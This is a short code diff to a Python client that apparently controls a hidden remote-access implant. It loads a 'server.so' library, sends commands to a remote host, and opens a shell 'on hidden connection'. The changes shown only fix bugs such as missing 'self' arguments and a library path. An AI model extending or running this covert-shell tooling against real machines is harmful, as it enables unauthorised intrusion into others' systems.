@@ -15,8 +15,8 @@ REQUEST_PORT = 1111
 MAGIC = b'mrk'
 SOCK_TIMEOUT = 0.1
 
-SERVER_SO = Path(__file__).parent / 'usermode' / 'server.so'
-SERVER = cdll.LoadLibrary(str(SERVER_SO))
+SERVER_SO = Path(__file__).absolute().parent.parent / 'usermode' / 'server.so'
+SERVER = cdll.LoadLibrary(SERVER_SO)
 
 
 class CommandType(Enum):
@@ -42,7 +42,7 @@ class Client:
         self._condition: Condition = Condition()
         self._thread = Thread(target=self._listen_for_responses)
         self._should_stop = False
-        self._remote = remote
+        self.bind(remote)
 
     def bind(self, remote):
         self._remote = remote
@@ -51,7 +51,7 @@ class Client:
     def start(self):
         self._thread.start()
 
-    def _get_job_id():
+    def _get_job_id(self):
         return random.randint(0, MAX_JOB_ID)
 
     def sendto(self, remote: str, command: CommandType, argument: str = '', *, timeout: Optional[float] = None, _job_id: Optional[int] = None):
@@ -79,7 +79,7 @@ class Client:
         # Open shell on hidden connection with the same job_id.
         _open_shell(self._sock, struct.pack('H', job_id))
 
-    def _stop_thread():
+    def _stop_thread(self):
         self._should_stop = True
         self._thread.join()
 
